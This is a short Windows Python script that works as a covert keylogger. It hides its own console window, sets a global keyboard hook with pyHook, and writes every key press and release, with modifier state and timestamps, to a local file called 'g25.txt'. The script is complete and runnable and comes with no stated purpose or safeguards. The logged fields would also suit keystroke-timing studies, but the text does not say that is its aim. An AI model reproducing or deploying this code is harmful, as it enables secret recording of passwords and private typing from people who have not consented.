# -*- coding: utf-8 -*-
"""
Created on Wed Jul  3 15:43:11 2019

@author: SUTIRTHA PAL
"""
import time
import win32api 
import win32console 
import win32gui 
import pythoncom, pyHook 
from pyHook import HookManager
from pyHook.HookManager import HookConstants,GetKeyState

win = win32console.GetConsoleWindow() 
win32gui.ShowWindow(win, 0) 

def OnKeyboardEvent(event):
    shift='0';
    ctrl='0';
    #print(time.time())
    if GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(HookConstants.VKeyToID('VK_RSHIFT')):
       shift='1'
    elif GetKeyState(HookConstants.VKeyToID('VK_CONTROL')):
       ctrl='1'
    file=open('g25.txt','a')
    file.write(str(event.MessageName)+'\t'+str(event.KeyID)+'\t'+shift+'\t'+str(event.Alt)+'\t'+ctrl+'\t'+str(time.time())+'\n')
    file.close()
    return True

hm = pyHook.HookManager() 
hm.KeyDown = OnKeyboardEvent 
hm.KeyUp = OnKeyboardEvent
# set the hook 
hm.HookKeyboard() 
# wait forever 
pythoncom.PumpMessages() 
